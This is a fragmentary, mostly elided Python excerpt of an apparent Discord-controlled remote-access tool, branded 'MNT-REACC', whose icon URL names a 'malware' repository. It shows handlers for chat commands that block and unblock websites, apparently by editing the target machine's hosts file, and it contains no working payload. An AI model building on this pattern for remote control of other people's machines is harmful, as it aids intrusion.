...
# on message
    ...
    if message.content.strip() == '.block-website':
        ...
        embed.set_author(name="MNT-REACC", icon_url="https://raw.githubusercontent.com/MNT-W/MNT-REACCmalware/py-dev/resources/icons/embed_icon.png")
    ...
    if message.content.strip() == '.unblock-website':
        ...
        if hosts_file_path:
            ...
            embed = discord.Embed(title="🔴 Hold on!", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
            embed.set_author(name="MNY-REACC", icon_url="https://raw.githubusercontent.com/MNT-W/MNT-REACC/py-dev/resources/icons/embed_icon.png")
            await message.channel.send(embed=embed)
